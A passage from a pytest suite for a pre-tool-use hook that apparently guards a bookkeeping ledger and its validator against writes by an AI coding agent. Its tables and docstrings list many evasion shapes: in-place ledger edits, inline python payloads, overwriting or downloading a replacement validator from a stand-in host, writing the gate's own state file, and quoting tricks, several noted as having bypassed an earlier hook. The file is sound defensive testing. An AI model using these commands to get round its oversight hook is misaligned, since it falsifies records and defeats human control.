    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


def test_a_plain_variable_in_a_message_is_not_an_execution(tmp_path):
    """A CORRECTION of an over-block this suite previously asserted as correct.

    `git commit -m "$VAR sed -i ledger/2026.csv"` was in the list above, on the reasoning that a
    `$NAME` makes the payload "not inert". It does not make it EXECUTABLE: bash expands a variable
    to its VALUE and does not re-evaluate that value, so no new command can appear — introducing
    one needs `$(…)`, a backtick or `<(…)`, which are all still refused. The command writes
    nothing, and the segment rewrite now says so.

    Kept as its own test rather than quietly deleted, because the assertion was wrong in the
    direction that is hardest to notice: an over-block looks like the gate working."""
    ledger_repo(tmp_path)
    assert run_ledger(
        tmp_path, shell(tmp_path, 'git commit -m "$VAR sed -i ledger/2026.csv"')
    ).returncode == 0


@pytest.mark.parametrize("command", [
    "git commit -m 'restore ledger/2026.csv from backup'",
    "git commit -m 'rm ledger/2026.csv was wrong'",
    "git commit -m 'cost is $5 (approx) for ledger/2026.csv'",
])
def test_inert_prose_is_still_prose(tmp_path, command):
    """Tightening the inert test must not re-create the false positives it was built to remove —
    a `$` in ordinary prose is not an expansion."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


# The two carriers pilot 4 measured, verbatim in shape from the office manager's own transcript,
# and the three shapes that must stay refused BECAUSE they are the same construct doing real work.
# Kept as one table so the pair is read together: an exemption without its counter-case is how each
# of this gate's earlier holes was written.
_PROSE_ABOUT_THE_LEDGER = (
    ("a commit message delivered as a quoted here-document",
     'git commit -m "$(cat <<\'EOF\'\n'
     'office: file the postage invoice and book it under PROC-0002\n\n'
     '- TSK-0006: bookkeeper booked ledger entry L2025-0001 (6.19 EUR, shipping)\n'
     'EOF\n)" 2>&1 | tail -10'),
    ("an envelope piped into the entry point, naming the validator in its summary",
     'cat <<\'EOF\' | python scripts/harness.py submit-result --from bookkeeper\n'
     '{"task_id": "TSK-0006", "summary": "Booked L2025-0001 via ledger_add.py."}\nEOF'),
    ("the same prose as an argument of the entry point",
     'python scripts/harness.py submit-result --task-id TSK-0011 --role bookkeeper '
     '--status-proposal FAILED --summary "ledger_add.py refused: 1,75 * 1,19 = 2,08 != 2,10"'),
    # ...and the same line with an INTERPRETER OPTION in front of the script. `-B` is what a
    # session that must not leave bytecode behind types, and the option class it fell outside of
    # was a list of letters.
    ("the entry point behind an interpreter option",
     "python -B scripts/harness.py submit-result --summary 'booked via ledger_add.py'"),
    ("the entry point behind an option cluster",
     "python -Bu scripts/harness.py submit-result --summary 'booked via ledger_add.py'"),
    # `-E` is the CASE control of that class, and until this round only a comment said so: `-E` is
    # an ordinary option, `-e` is a payload flag, and an option class that folded the two would
    # refuse this line. It is what keeps `test_the_two_readers_of_an_inline_payload_option_agree`
    # honest about comparing letters rather than case.
    ("the entry point behind an upper-case option that differs from a payload flag only in case",
     "python -E scripts/harness.py submit-result --summary 'booked via ledger_add.py'"),
    ("the validator's own validate run behind an interpreter option",
     "python -B scripts/ledger_add.py --validate ledger/2026.csv"),
    # ...and the same shape whose ARGUMENT PROSE happens to spell an interpreter payload flag.
    # `BUG-0063`: both exemptions ended in a lookahead that scanned the whole tail for a
    # `-c`/`-e`/`-m` word, so writing about the `-m` flag put the P4-12 refusal back. The letters
    # are derived rather than typed in
    # `test_an_option_word_after_the_script_is_an_argument_not_a_payload`; this entry is the line
    # the bug was measured on, kept verbatim beside its counter-cases.
    ("the entry point whose summary talks about a flag",
     'python scripts/harness.py evidence --summary "fixed the -m flag handling in '
     'scripts/ledger_add.py"'),
    # ...and the price of vouching for the VALIDATOR's stage the way the entry point's is vouched
    # for: the words in its own arguments stop being read as commands. Pinned as an ALLOW so the
    # widening is measured rather than silent; its counter-cases are in the table below.
    ("the validator's own run, whose note names the folder it lives in",
     'python scripts/ledger_add.py add --note "cp backup.py scripts/"'),
)
_WORK_ON_THE_LEDGER = (
    ("a shell that EXECUTES its here-document body",
     "bash <<'EOF'\nsed -i s/119.00/150.00/ ledger/2026.csv\nEOF\ngit commit -m x"),
    ("an executed substitution inside the message",
     'git commit -m "$(sed -i s/119.00/150.00/ ledger/2026.csv)"'),
    ("the entry point with a redirect into the ledger",
     "python scripts/harness.py doctor > ledger/2026.csv && git commit -m x"),
    # THE STAGE BESIDE THE EXEMPT ONE, which is what the first cut of that exemption gave away:
    # it dropped the whole SEGMENT, so a second pipeline stage rode along free. Three shapes, one
    # property -- the write is not in the entry point's stage.
    ("a write in the stage after the entry point",
     "python scripts/harness.py doctor | tee scripts/ledger_add.py"),
    ("a write onto the gate's own state file after the entry point",
     "python scripts/harness.py doctor | tee .claude/ledger_state.json"),
    ("a copy driven by xargs after the entry point",
     "python scripts/harness.py doctor | xargs -I{} cp {} scripts/ledger_add.py"),
    # ...and a decoy validator behind the same interpreter option the exemption now steps over.
    ("a decoy validator behind an interpreter option, then a commit",
     "python -B tools/ledger_add.py && git commit -m x"),
    # THE SAME STAGE-VERSUS-SEGMENT PROPERTY, asked of the VALIDATOR's exemption. It kept the
    # whole-segment shape one round after the entry point's was narrowed, and a segment holds a
    # whole pipeline -- so the neighbour rode along free. Measured exit 0 on the shipped hook
    # before TSK-0083; the inline-payload sibling is here because it was refused only by the
    # trailing lookahead that BUG-0063 removed.
    ("a write in the stage after the validator",
     "python scripts/ledger_add.py --validate ledger/2026.csv | "
     "sed -i s/119.00/150.00/ ledger/2026.csv && git commit -m x"),
    ("an inline payload in the stage after the validator",
     "python scripts/ledger_add.py --validate ledger/2026.csv | "
     "python -c \"open('ledger/2026.csv','w')\" && git commit -m x"),
    # ...and the counter-half of the allow directly above: the same words, in a stage of their own,
    # are a command again -- both as a pipeline neighbour and as a separate segment.
    ("a copy into the validator's folder after the validator",
     "python scripts/ledger_add.py --validate ledger/2026.csv | xargs -I{} cp {} scripts/ "
     "&& git commit -m x"),
    ("a copy into the validator's folder beside the validator run",
     "python scripts/ledger_add.py --validate ledger/2026.csv ; cp backup.py scripts/ "
     "&& git commit -m x"),
    # ...and the inline payload with no script argument at all, which is `_INLINE_CODE_RX`'s own
    # direction. It used to be the counter-test for `_INTERPRETER_OPTIONS` as well, which it never
    # measured (`test_a_real_interpreter_payload_before_the_script_is_still_refused`); it belongs
    # here, where the shape is the claim.
    ("an inline payload writing the validator",
     "python -c \"open('scripts/ledger_add.py','w').write('')\" && git commit -m x"),
)


@pytest.mark.parametrize("what,command", _PROSE_ABOUT_THE_LEDGER)
def test_prose_about_the_ledger_in_a_body_or_an_argument_is_not_a_write(tmp_path, what, command):
    """P4-12: the office manager was refused a commit "on the word ledger", and was right.

    MEASURED (pilot 4, half 3): `gate_ledger_valid` blocked four calls that wrote nothing. Two
    carriers, both ordinary: a commit message handed over as `$(cat <<'EOF' … EOF)`, whose BODY
    named a booked entry, and a `--summary` of the kernel's entry point naming `ledger_add.py`
    because the work had. Each fragment of that prose was read as a command segment, and a segment
    naming a ledger path whose first word is not a known read verb is a write here.

    The fix is two definitions this kit already had, applied where they were missing: a
    literally-quoted here-document body is not a pipeline (`_compat.literal_heredoc_free`, whose
    own rule keeps the body a SHELL would parse), and the kernel's entry point is not a shell write.
    """
    ledger_repo(tmp_path)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 0, "%s was refused although it writes nothing:\n%s" % (
        what, result.stderr)


@pytest.mark.parametrize("what,command", _WORK_ON_THE_LEDGER)
def test_the_same_constructs_still_refuse_a_real_write(tmp_path, what, command):
    """The counter-half: each exemption above, doing real work, is still refused.

    A body fed to a command PARSER is executed however its delimiter is quoted; a substitution is
    executed whatever it stands in; and a redirect is judged before any verb exemption is reached,
    so the entry point cannot carry one into the ledger.
    """
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what


def _letters_by_option_position(gate):
    """Letters `_INTERPRETER_OPTIONS` will not step over on the way to a script argument.

    Case-folded, like its sibling below, because the two readers differ in case ON PURPOSE and
    that difference is not the thing being compared — see
    `test_the_two_readers_of_an_inline_payload_option_agree`."""
    return {letter.lower() for letter in string.ascii_letters
            if not gate._ENTRY_POINT_RUN_RX.search(
                "python -%s scripts/harness.py doctor" % letter)}


def _letters_by_inline_reader(gate):
    """The same set as the OTHER reader in the module spells it — `_INLINE_CODE_RX`, which decides
    whether `handle_pre_tool_use` keeps an interpreter line unstripped."""
    return {letter.lower() for letter in string.ascii_letters
            if gate._INLINE_CODE_RX.search("python -%s payload" % letter)}


def _inline_payload_option_letters():
    """The single-letter interpreter options that make the interpreter read its program from the
    COMMAND LINE, taken as the UNION of the module's two independent spellings of that set.

    Deriving the parametrisation from the one pattern a test checks is a test that cannot fail:
    when the letter falls out of the pattern, its case falls out of the run with it. Measured —
    mutating `_INTERPRETER_OPTIONS` from `[cem]` to `[cm]` left the whole ledger selection green
    while `python -e scripts/harness.py … && git commit` went to exit 0. The union keeps the case
    alive as long as EITHER reader still knows the letter, and
    `test_the_two_readers_of_an_inline_payload_option_agree` is the tripwire on the two drifting
    apart at all. What neither construction can see is both readers losing the same letter in one
    change; that is the residual, and it is not claimed away here.
    """
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    letters = sorted(_letters_by_option_position(gate) | _letters_by_inline_reader(gate))
    assert letters, ("neither reader treats any option letter as an inline payload any more — the "
                     "tests below would be parametrised over nothing and could not fail")
    return letters


def test_the_two_readers_of_an_inline_payload_option_agree():
    """The gate says "this option carries the program inline" in two places — the option class the
    exemptions step over, and the reader that decides whether an interpreter line keeps its script
    path. They must mean the same LETTERS: if the option class forgets one, the exemption steps
    over a real payload, and no case built from that same class would notice.

    Letters, not case, and that is a measured distinction rather than a convenience: the option
    class is deliberately case-SENSITIVE (`-E` is an option, `-e` is a payload flag) while the
    inline reader is `re.IGNORECASE` and therefore also answers yes to `-E`. That over-match costs
    nothing — it only keeps an interpreter line unstripped, the conservative direction — and the
    distinction the option class makes is pinned separately, by the `-E` entry of
    `_PROSE_ABOUT_THE_LEDGER` (`test_prose_about_the_ledger_in_a_body_or_an_argument_is_not_a_write`),
    which goes red the moment `_INTERPRETER_OPTIONS` starts folding case."""
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    by_position = _letters_by_option_position(gate)
    by_reader = _letters_by_inline_reader(gate)
    assert by_position == by_reader, (
        "_INTERPRETER_OPTIONS and _INLINE_CODE_RX disagree about which option carries an inline "
        "payload: only the option class knows %s, only the inline reader knows %s"
        % (sorted(by_position - by_reader) or "nothing",
           sorted(by_reader - by_position) or "nothing"))


@pytest.mark.parametrize("letter", _inline_payload_option_letters())
def test_an_option_word_after_the_script_is_an_argument_not_a_payload(tmp_path, letter):
    """BUG-0063: an interpreter reads a payload only while it is still reading OPTIONS, so the
    position decides, not the letters. Both exemptions used to end in a lookahead over the whole
    tail, and honest argument prose (`--summary "fixed the -m flag handling in
    scripts/ledger_add.py"`) therefore lost the exemption P4-12 was built for — measured exit 2
    against the shipped hook. After the script name those letters belong to the script's own
    parser."""
    ledger_repo(tmp_path)
    command = ('python scripts/harness.py evidence --summary '
               '"fixed the -%s flag handling in scripts/ledger_add.py" && git commit -m x' % letter)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 0, "-%s in argument prose was refused:\n%s" % (
        letter, result.stderr)


# The two canonical invocations, each with the tail that makes the line reach this gate at all.
_VOUCHED_INVOCATIONS = (
    ("the entry point", "scripts/harness.py",
     "evidence --summary \"booked via scripts/ledger_add.py\""),
    ("the validator", "scripts/ledger_add.py", "--validate ledger/2026.csv"),
)
# ...the same two, addressed by the PATH they are anchored to. Derived, so a third guarded program
# arrives in every test below the day it is added to the table above.
_VOUCHED_INVOCATIONS_BY_PATH = tuple((script, tail) for _w, script, tail in _VOUCHED_INVOCATIONS)


@pytest.mark.parametrize("what,script,tail", _VOUCHED_INVOCATIONS)
@pytest.mark.parametrize("letter", _inline_payload_option_letters())
def test_a_real_interpreter_payload_before_the_script_is_still_refused(
        tmp_path, letter, what, script, tail):
    """The counter-half, IN THE POSITION THE CLAIM IS ABOUT: the payload option stands between the
    interpreter and the script, which is the only place it can, and the exemption must not step
    over it.

    The first cut of this test ran `python -<letter> "open(…)"` with no script argument at all.
    That line is refused by `_INLINE_CODE_RX` alone, so it stayed green while
    `_INTERPRETER_OPTIONS` — the pattern the comment beside it credits — was mutated from `[cem]`
    to `[cm]` and `python -e scripts/harness.py … && git commit` went to exit 0. A counter-test
    that passes for a different reason than the one it names is a claim, not a measurement."""
    ledger_repo(tmp_path)
    command = "python -%s %s %s && git commit -m x" % (letter, script, tail)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, "%s / -%s" % (
        what, letter)


# HOW THE SAME FILE NAME CAN BE SPELLED, which is what a shell resolves and this gate has to
# resolve with it. Parametrised over the QUOTING rather than over suffixes: the first cut of these
# tests listed `.bak`, `-evil`, `.pyc`, and a list of suffixes is a claim about which neighbours
# exist.
#
# QUOTING CAN FALL ANYWHERE IN THE WORD, and the templates used to put it only around the WHOLE
# word — while the defect the docstring below quotes is `scripts/ledger_add.py'.bak'`, quoting
# around the SUFFIX. Ten generated cases, none of them the measured one. So the spellings are
# generated from the word instead of listed: whole-word quoting, an empty span at either end, and
# the same three applied to the word SPLIT at its last dot, which is where a suffix begins.
def _quoting_spellings(word):
    """(what, spelling) for every way quoting can hide a word boundary inside `word`."""
    head, dot, tail = word.rpartition(".")
    split = [("the suffix in single quotes", "%s.'%s'" % (head, tail)),
             ("the suffix in double quotes", '%s."%s"' % (head, tail)),
             ("an empty span before the suffix", "%s''.%s" % (head, tail)),
             ("the dot itself quoted", "%s'.'%s" % (head, tail))] if dot else []
    return [("plain", word),
            ("wrapped in double quotes", '"%s"' % word),
            ("wrapped in single quotes", "'%s'" % word),
            ("an empty quoted span glued to the end", "%s''" % word),
            ("an empty quoted span glued to the front", "''%s" % word)] + split


_QUOTING_SPELLINGS = tuple(what for what, _s in _quoting_spellings("a.b"))


@pytest.mark.parametrize("what", _QUOTING_SPELLINGS)
@pytest.mark.parametrize("canonical,tail", _VOUCHED_INVOCATIONS_BY_PATH)
def test_quoting_inside_a_word_does_not_change_which_file_it_names(
        tmp_path, canonical, tail, what):
    """Both halves of the same property, because quoting hides a word boundary in both directions.

    A SIBLING first: the anchor used to end on `\\b`, which the `.` of `.bak` satisfies, so
    `python scripts/ledger_add.py.bak …` was vouched for as the guarded program. Narrowing the
    anchor to `(?![\\w.-])` fixed the bare spelling and not the quoted one — a shell removes quote
    marks character by character and the gate did not, so `scripts/ledger_add.py'.bak'` walked
    straight back in (measured through the registered chain, exit 0). A character class cannot
    answer where a word ends; quote removal can, and `_quoting_resolved` is where it happens.

    THE CANONICAL path second, in the same spellings: it must keep its exemption however it is
    quoted, or the fix would have bought refusals for the remedy. `python "scripts/ledger_add.py"
    --validate …` was refused as a stranger before that view existed."""
    ledger_repo(tmp_path)
    sibling = dict(_quoting_spellings(canonical + ".bak"))[what]
    command = "python %s %s && git commit -m x" % (sibling, tail)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, "sibling/%s" % what
    same = dict(_quoting_spellings(canonical))[what]
    command = "python %s %s && git commit -m x" % (same, tail)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, "canonical/%s" % what


@pytest.mark.parametrize("what", _QUOTING_SPELLINGS)
def test_quoting_does_not_hide_a_decoy_validator(tmp_path, what):
    """The other side of the same view: `python tools/ledger_add".py" && git commit` escaped the
    decoy rule for the same reason the sibling escaped the anchor — the quote marks stood inside
    the word and only the shell removed them."""
    ledger_repo(tmp_path)
    command = "python %s && git commit -m x" % dict(_quoting_spellings("tools/ledger_add.py"))[what]
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what


@pytest.mark.parametrize("what,command", [
    ("a decoy run, then a pointless step into the validator's folder",
     "python tools/ledger_add.py && cd \"scripts\" && git commit -m x"),
    ("the step first, the decoy behind it",
     "cd 'scripts' && python ../tools/ledger_add.py && git commit -m x"),
    ("the decoy in a pipeline before the step",
     "cat x | python tools/ledger_add.py && cd \"scripts\" && git commit -m x"),
    ("a ledger write and a step, in one call",
     "sed -i s/119/150/ ledger/2026.csv && cd \"scripts\" && git commit -m x"),
    ("the escape spelling of the step",
     "python tools/ledger_add.py && c\\d scripts && git commit -m x"),
    ("a decoy that also names the ledger",
     "python tools/ledger_add.py ledger/2026.csv && cd \"scripts\" && git commit -m x"),
    # ...and the same rule in the other predicate, where the exemption had been DEAD code: two
    # literal U+0008 bytes stood where `\b` belongs, so the regex could never match a command line.
    # Repairing it without this rule would have forgiven any segment naming the validator at all —
    # including one that overwrites it.
    ("a copy onto the canonical validator, then a step into its folder",
     "cp evil.py scripts/ledger_add.py && cd scripts && git commit -m x"),
    ("an extraction over the validator's folder, then a step into it",
     "tar -xf evil.tar -C scripts/ && cd scripts && git commit -m x"),
])
def test_stepping_into_the_validators_directory_forgives_only_the_bare_name(tmp_path, what,
                                                                            command):
    """`cd scripts` exists here for ONE shape: in that directory the bare `ledger_add.py` IS the
    canonical file, so reading it as a decoy refused the gate's own advertised remedy. It was
    asked of the whole COMMAND and then ended the decoy loop outright, so any `cd scripts` anywhere
    switched the rule off for every segment — and `_quoting_resolved` made that reachable from
    spellings the raw text never contained (`cd "scripts"`, `c\\d scripts`), which is a second
    reading REMOVING a refusal. A path with a directory in it names a different file from every
    working directory there is, so it is never what the step forgives."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what


def _word_end_characters(wanted=True):
    """The characters the RUNNING `_WORD_END` treats as ending a word (or, with `wanted=False`,
    the filename characters it does not) — probed off the pattern, never listed here."""
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    probe = re.compile(gate._WORD_END)
    candidates = string.printable
    found = [char for char in candidates if bool(probe.match(char)) is wanted]
    assert found, "the word-end probe found nothing — this test could not fail"
    return found


# THE WORD-END SET AS THIS TEST EXPECTS IT, written here INDEPENDENTLY of the gate. `_WORD_END` is
# hand-written and cannot be derived from anything the repo already has, so what CLAUDE.md asks of
# an unavoidable enumeration applies: a tripwire that measures both ends. A second statement of the
# set is the only thing that can measure the first — deriving the expectation from the pattern
# under test is what made the previous cut of this tripwire green while the verifier's mutation
# dropped `<` and `>` from it (the derived parameter list lost the very entries it should have
# defended, exactly as the `[cem]` parametrisation did one round earlier).
_EXPECTED_WORD_ENDS = set(" \t\n\r\x0b\x0c" + "\"'`;|&()<>")


def test_every_word_end_character_is_needed_and_no_other_ends_the_word():
    """The tripwire the `_WORD_END` comment names, with BOTH ends, because a hand-written set rots
    in two directions.

    Drop an entry and a destination stops being seen: `-C scripts/` followed by that character is a
    write into the validator's folder. Add a FILENAME character and the opposite breaks:
    `scripts/x` is a file, not the bare directory, and reading it as one would refuse ordinary work
    in that folder. The set is stated here rather than read off the gate, so the two can disagree;
    the per-character half below is then asked of the composed pattern that actually runs."""
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    assert set(_word_end_characters()) == _EXPECTED_WORD_ENDS, (
        "`_WORD_END` and this test disagree; only %r ends a word for the gate, only %r for this "
        "test — decide which is right and change BOTH"
        % (sorted(set(_word_end_characters()) - _EXPECTED_WORD_ENDS),
           sorted(_EXPECTED_WORD_ENDS - set(_word_end_characters()))))
    for char in sorted(_EXPECTED_WORD_ENDS):
        assert gate._PROTECTED_DIR_RX.search("tar -xf e.tar -C scripts/" + char), (
            "%r no longer ends the destination word" % char)
    for other in _word_end_characters(wanted=False):
        assert not gate._PROTECTED_DIR_RX.search("tar -xf e.tar -C scripts/" + other), (
            "%r started ending the destination word" % other)


@pytest.mark.parametrize("char", _word_end_characters(wanted=False))
@pytest.mark.parametrize("canonical,tail", _VOUCHED_INVOCATIONS_BY_PATH)
def test_a_name_that_continues_past_the_canonical_one_is_a_different_file(
        tmp_path, canonical, tail, char):
    """A SIBLING is not a suffix from a list, it is any name that starts with the canonical one and
    keeps going — and the characters it can keep going with are exactly the ones that do not end a
    shell word. So they are probed off `_WORD_END` instead of typed, and the anchor is asked about
    every one of them.

    The anchor was `\\b` (satisfied by the `.` of `.bak`), then `(?![\\w.-])`, which is a LIST of
    continuation characters: every filename character outside it ended the path for this reader and
    not for the shell, so `scripts/ledger_add.py+x`, `…py~`, `…py,v`, `…py@`, `…py%1`, `…py=x`,
    `…py:evil` (an NTFS data stream) and `…py/../evil.py` were all vouched for as the guarded
    program — measured exit 0 through the registered chain, with a filesystem witness showing the
    sibling actually ran. The anchor is now the same `_WORD_END` the destination reader uses."""
    ledger_repo(tmp_path)
    command = "python %s%sx %s && git commit -m x" % (canonical, char, tail)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)


@pytest.mark.parametrize("char", _word_end_characters())
@pytest.mark.parametrize("canonical,tail", _VOUCHED_INVOCATIONS_BY_PATH)
def test_a_quoted_word_end_character_does_not_end_the_word(tmp_path, canonical, tail, char):
    """The other half of the sibling property, and the one the fix for the first half opened.

    Every character that ends a shell WORD is a legal character IN A FILENAME, and quoting is what
    tells the two apart. Resolving the quoting before any reader looks at the text throws that
    difference away: `python "scripts/ledger_add.py evil.py" ledger/2026.csv && git commit` became
    the text `python scripts/ledger_add.py evil.py ledger/…`, in which the canonical path is
    followed by a space, so the anchor said "the word ends here" and vouched for a program nobody
    guards. Measured exit 0 through the registered chain, with a shell arbiter showing ONE argv word
    and a filesystem witness showing the sibling running and rewriting the ledger; `(`, `>`, `<`,
    `'` and a doubled space each spell the same hole.

    So the characters are probed off `_WORD_END` rather than listed, exactly as its unquoted
    counter-test does, and the fix is `_as_one_word`: a value the shell BUILT keeps a quote mark
    when it carries such a character. The counter-direction — the canonical path however it is
    quoted keeps its exemption — is `test_quoting_inside_a_word_does_not_change_which_file_it_names`
    and is what stops that from being answered by refusing everything quoted."""
    ledger_repo(tmp_path)
    quote = "'" if char != "'" else '"'
    command = "python %s%s%s%s %s && git commit -m x" % (
        quote, canonical, char, "evil" + quote, tail)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)


@pytest.mark.parametrize("char", _word_end_characters(wanted=False))
def test_only_the_validators_own_directory_forgives_the_bare_name(tmp_path, char):
    """`cd scripts` forgives the bare name because IN THAT DIRECTORY it is the canonical file. A
    directory whose name merely starts with `scripts` is somebody else's, and the bare name there
    is a validator nobody guards.

    The anchor was `\\b`, which is satisfied by `-`, `.` and `/` alike, so `cd scripts-evil`,
    `cd scripts.bak` and `cd scripts/../evil` all bought the exemption — measured exit 0 through
    the registered chain. A longer directory name can continue with exactly the characters that do
    not end a shell word, so they are probed off `_WORD_END` instead of typed. The counter-half,
    the directory itself, is `test_the_remedy_typed_from_inside_the_validators_directory_still_works`.
    """
    ledger_repo(tmp_path)
    command = ("cd scripts%sx && python ledger_add.py --validate ledger/2026.csv && git commit -m x"
               % char)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)


# THE BARE NAME AS A TARGET, in the six shapes a write reaches a file — and the ledger reached
# through the same exemption. One property: the step inside forgives a RUN of the validator, never
# a segment that merely names it.
_A_TARGET_INSIDE_THE_VALIDATORS_DIRECTORY = (
    ("a copy onto the bare name", "cd scripts && cp ../evil.py ledger_add.py"),
    ("a move onto the bare name", "cd scripts && mv ../evil.py ledger_add.py"),
    ("a download onto the bare name", "cd scripts && curl -o ledger_add.py http://x/evil.py"),
    ("a pipe into the bare name", "cd scripts && cat ../evil.py | tee ledger_add.py"),
    ("an in-place edit of the bare name", "cd scripts && sed -i s/a/b/ ledger_add.py"),
    ("a delete of the bare name", "cd scripts && rm ledger_add.py"),
    ("a copy onto it and a commit", "cd scripts && cp ../evil.py ledger_add.py && git commit -m x"),
    ("the semicolon spelling of the step", "cd scripts ; cp ../evil.py ledger_add.py"),
    ("the dot-slash spelling of the step", "cd ./scripts && cp ../evil.py ledger_add.py"),
    # ...and the LEDGER, reached by putting the bare name beside a write to it
    ("a ledger edit beside the bare name",
     "cd scripts && sed -i s/119/150/ ../ledger/2026.csv ledger_add.py && git commit -m x"),
    ("a ledger overwrite beside the bare name",
     "cd scripts && cp evil.csv ../ledger/2026.csv ledger_add.py && git commit -m x"),
)


@pytest.mark.parametrize("what,command", _A_TARGET_INSIDE_THE_VALIDATORS_DIRECTORY)
def test_the_step_inside_forgives_a_run_and_not_a_target(tmp_path, what, command):
    """The exemption is justified by "`cd scripts && python ledger_add.py --validate …` RUNS the
    canonical validator from inside its own directory". Asking only whether the segment NAMES the
    bare validator freed every segment carrying that name as a TARGET.

    Measured end to end with real hook processes: `git commit` refused on a broken ledger, then
    `cd scripts && cp ../evil.py ledger_add.py` exit 0 and really executed, leaving `import sys;
    sys.exit(0)` as the ledger's judge, then the same commit exit 0. The block is gone and the file
    that decides it has been replaced — the heaviest chain this gate knows.

    The counter-half is `test_the_remedy_typed_from_inside_the_validators_directory_still_works`:
    the run itself must stay allowed, or this fix would have bought back the over-refusal
    `BUG-0064` removed."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what


def test_the_step_inside_asks_for_a_run_and_not_for_a_mention():
    """The same property at the predicate, over a verb set this file does not choose: every verb
    the gate's own read-only table knows, plus the interpreters — which are the ONLY words that can
    make a segment a run, and must not do so when the bare name is an argument instead of the
    script. `_only_the_bare_validator` knows nothing about `_READ_ONLY_VERBS`, so this is a
    cross-check rather than the pattern under test asked about itself."""
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    assert gate._only_the_bare_validator("python ledger_add.py --validate ../ledger/2026.csv")
    assert gate._only_the_bare_validator("python -B ./ledger_add.py --validate ../ledger/2026.csv")
    for verb in sorted(gate._READ_ONLY_VERBS) + ["python", "python3.12", "py"]:
        segment = "%s ../evil.py ledger_add.py" % verb
        assert not gate._only_the_bare_validator(segment), segment


# A DIRECTORY PART MAKES IT A DIFFERENT FILE, in the shapes a path can carry one. Built around one
# directory word instead of listed as finished paths, so what is parametrised is the property and
# not five spellings somebody thought of.
_DIRECTORY_PARTS = ("tools/", "../tools/", "./tools/", "/tmp/evil/", "a/b/")


@pytest.mark.parametrize("directory", _DIRECTORY_PARTS)
def test_a_validator_with_a_directory_part_loses_the_step_inside(tmp_path, directory):
    """`_only_the_bare_validator` has two halves, and this is the one no test measured.

    The half that asks for a RUN is pinned by the test above. The half that asks that the stage
    name the validator NO OTHER WAY was carried only by a docstring example that the caller
    refutes: `python ledger_add.py && rm ledger_add.py` never reaches this predicate as one unit,
    because `&&` is a segment separator. On a stage that no split can take apart, the half is what
    decides — an argument handed to the canonical run is inside the vouched stage, so a decoy named
    there would be vouched for with it. Measured in a clone outside the repo: with the
    no-directory half removed, `cd scripts && python ledger_add.py --validate ../ledger/2026.csv
    ../tools/ledger_add.py && git commit -m x` falls from rc 2 to rc 0 while the whole hook suite
    stays green.

    The counter-end is in the same case: the bare spelling of the same run is the gate's own
    advertised remedy and must stay allowed, so this cannot be answered by refusing the run.
    """
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    stage = "python ledger_add.py --validate ../ledger/2026.csv %sledger_add.py" % directory
    assert not gate._only_the_bare_validator(stage), stage
    ledger_repo(tmp_path)
    command = "cd scripts && %s && git commit -m x" % stage
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, directory
    remedy = "cd scripts && python ledger_add.py --validate ../ledger/2026.csv && git commit -m x"
    assert run_ledger(tmp_path, shell(tmp_path, remedy)).returncode == 0, "the remedy itself"


@pytest.mark.parametrize("char", _word_end_characters())
def test_a_quoted_directory_name_does_not_forgive_the_bare_validator(tmp_path, char):
    """The `cd` half of what `_as_one_word` buys, and the trap its docstring warns about.

    Resolving quotation makes `cd "scripts;evil"` the word `scripts;evil`, in which `_CD_SCRIPTS_RX`
    would find its `cd scripts` followed by something `_WORD_END` calls a boundary — and the step
    into `scripts/` is what makes a bare `ledger_add.py` the guarded file rather than a validator
    nobody watches. `_as_one_word` stops that by keeping a quote mark in FRONT of a word the shell
    built, which the anchor `cd\\s+\\.?/?scripts` has no room for.

    That is a property of the ANCHOR, not of `_WORD_END`, and this test is here because the
    difference is invisible in prose: `_PROTECTED_DIR_RX` carries a `["']?` in exactly that
    position and is right to, being a refusing reader. Adding one here — the obvious tidy-up —
    hands the exemption to any directory whose name merely starts with `scripts`. Measured: with
    `["']?` inserted after `cd\\s+`, these cases go to rc 0.

    The characters are probed off `_WORD_END` rather than listed, like its unquoted counterpart
    `test_only_the_validators_own_directory_forgives_the_bare_name`; the counter-end (the real
    directory keeps forgiving the bare name) is
    `test_the_remedy_typed_from_inside_the_validators_directory_still_works`.
    """
    ledger_repo(tmp_path)
    quote = "'" if char != "'" else '"'
    command = ("cd %sscripts%sevil%s && python ledger_add.py --validate ledger/2026.csv "
               "&& git commit -m x" % (quote, char, quote))
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)


# THE THREE RUNS THIS GATE VOUCHES FOR, each with the step that makes its spelling name the guarded
# file, and the two things it protects addressed from that working directory. The bare name is the
# canonical validator only after a `cd scripts`, so the step is part of the spelling.
_VOUCHED_STAGES = (
    ("the kernel entry point", "", "python scripts/harness.py doctor",
     "scripts/ledger_add.py", "ledger/2026.csv"),
    ("the canonical validator", "", "python scripts/ledger_add.py --validate ledger/2026.csv",
     "scripts/ledger_add.py", "ledger/2026.csv"),
    ("the bare validator from inside its own directory", "cd scripts && ",
     "python ledger_add.py --validate ../ledger/2026.csv",
     "ledger_add.py", "../ledger/2026.csv"),
)
# ...and what a stage BESIDE one of them can do with the target it is handed. Templates over the
# target, so the same writes are asked of the ledger's judge and of the ledger itself.
_WRITING_NEIGHBOURS = (
